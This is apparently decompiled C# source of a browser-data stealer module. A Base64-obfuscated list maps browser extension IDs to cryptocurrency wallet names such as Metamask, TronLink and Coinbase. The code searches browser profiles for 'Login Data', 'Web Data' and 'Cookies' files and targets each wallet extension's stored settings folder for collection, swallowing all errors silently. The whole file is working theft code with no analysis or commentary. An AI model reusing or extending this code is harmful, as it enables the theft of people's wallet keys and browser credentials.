using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

// Token: 0x0200001D RID: 29
public class BrEx : FileScanner
{
	// Token: 0x060000A7 RID: 167 RVA: 0x000080E8 File Offset: 0x000062E8
	public void Init(IList<string> browserPaths)
	{
		this.Locals = new List<string>(browserPaths ?? new List<string>());
		this.PathsCollection = from x in Encoding.UTF8.GetString(Convert.FromBase64String("ZmZuYmVsZmRvZWlvaGVua2ppYm5tYWRqaWVoamhhamJ8WW9yb2lXYWxsZXQKaWJuZWpkZmptbWtwY25scGVia2xtbmtvZW9paG9mZWN8VHJvbmxpbmsKamJkYW9jbmVpaWlubWpiamxnYWxoY2VsZ2Jlam1uaWR8TmlmdHlXYWxsZXQKbmtiaWhmYmVvZ2FlYW9laGxlZm5rb2RiZWZncGdrbm58TWV0YW1hc2sKYWZiY2JqcGJwZmFkbGttaG1jbGhrZWVvZG1hbWNmbGN8TWF0aFdhbGxldApobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZHxDb2luYmFzZQpmaGJvaGltYWVsYm9ocGpiYmxkY25nY25hcG5kb2RqcHxCaW5hbmNlQ2hhaW4Kb2RiZnBlZWloZGtiaWhtb3BrYmptb29uZmFubGJmY2x8QnJhdmVXYWxsZXQKaHBnbGZoZ2ZuaGJncGpkZW5qZ21kZ29laWFwcGFmbG58R3VhcmRhV2FsbGV0CmJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjfEVxdWFsV2FsbGV0CmNqZWxmcGxwbGViZGpqZW5sbHBqY2JsbWprZmNmZm5lfEpheHh4TGliZXJ0eQpmaWhrYWtmb2JrbWtqb2pwY2hwZmdjbWhmam5tbmZwaXxCaXRBcHBXYWxsZXQKa25jY2hkaWdvYmdoZW5iYmFkZG9qam5uYW9nZnBwZmp8aVdhbGxldAphbWttamptbWZsZGRvZ21ocGpsb2ltaXBib2ZuZmppaHxXb21iYXQKZmhpbGFoZWltZ2xpZ25kZGtqZ29ma2NiZ2VraGVuYmh8QXRvbWljV2FsbGV0Cm5sYm1ubmlqY25sZWdrampwY2ZqY2xtY2ZnZ2ZlZmRtfE1ld0N4Cm5hbmptZGtuaGtpbmlmbmtnZGNnZ2NmbmhkYWFtbW1qfEd1aWxkV2FsbGV0Cm5rZGRnbmNkamdqZmNkZGFtZmdjbWZubGhjY25pbWlnfFNhdHVybldhbGxldApmbmpobWtoaG1rYmpra2FibmRjbm5vZ2Fnb2dibmVlY3xSb25pbldhbGxldAphaWlmYm5iZm9icG1lZWtpcGhlZWlqaW1kcG5scGdwcHxUZXJyYVN0YXRpb24KZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWJ8SGFybW9ueVdhbGxldAphZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZ3xDb2luOThXYWxsZXQKY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmt8VG9uQ3J5c3RhbApwZGFkamtma2djYWZnYmNlaW1jcGJrYWxuZm5lcGJua3xLYXJkaWFDaGFpbg==")).Split(new string[]
		{
			"\n",
			Environment.NewLine
		}, StringSplitOptions.RemoveEmptyEntries)
		select new KeyValuePair<string, string>(x.Split(new char[]
		{
			'|'
		})[0], x.Split(new char[]
		{
			'|'
		})[1]);
	}

	// Token: 0x060000A9 RID: 169 RVA: 0x00008164 File Offset: 0x00006364
	public override string GetFolder(FileScannerArg scannerArg, FileInfo filePath)
	{
		foreach (KeyValuePair<string, string> keyValuePair in this.PathsCollection)
		{
			if (filePath.Directory.FullName.Contains(keyValuePair.Key))
			{
				return scannerArg.Tag;
			}
		}
		return "UnknownExtension";
	}

	// Token: 0x060000AA RID: 170 RVA: 0x000081D8 File Offset: 0x000063D8
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			new List<string>();
			foreach (string baseDirectory in from x in this.Locals
			select Environment.ExpandEnvironmentVariables(x))
			{
				foreach (string text in FileCopier.FindPaths(baseDirectory, 1, 1, new string[]
				{
					"Login Data",
					"Web Data",
					"Cookies"
				}))
				{
					try
					{
						string text2 = string.Empty;
						string text3 = string.Empty;
						text2 = new FileInfo(text).Directory.FullName;
						if (text2.Contains("Opera GX Stable"))
						{
							text3 = "Opera GX";
						}
						else
						{
							text3 = (text.Contains("AppData\\Roaming\\") ? FileCopier.ChromeGetRoamingName(text2) : FileCopier.ChromeGetLocalName(text2));
						}
						if (!string.IsNullOrEmpty(text3))
						{
							text3 = text3[0].ToString().ToUpper() + text3.Remove(0, 1);
							string text4 = FileCopier.ChromeGetName(text2);
							if (!string.IsNullOrEmpty(text4))
							{
								foreach (KeyValuePair<string, string> keyValuePair in this.PathsCollection)
								{
									list.Add(new FileScannerArg
									{
										Pattern = new string(new char[]
										{
											'*'
										}),
										Tag = string.Concat(new string[]
										{
											text3,
											"_",
											text4,
											"_",
											keyValuePair.Value
										}),
										Recoursive = false,
										Directory = Path.Combine(text2, "Local Extension Settings", keyValuePair.Key)
									});
								}
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x04000017 RID: 23
	private List<string> Locals;

	// Token: 0x04000018 RID: 24
	private IEnumerable<KeyValuePair<string, string>> PathsCollection;
}
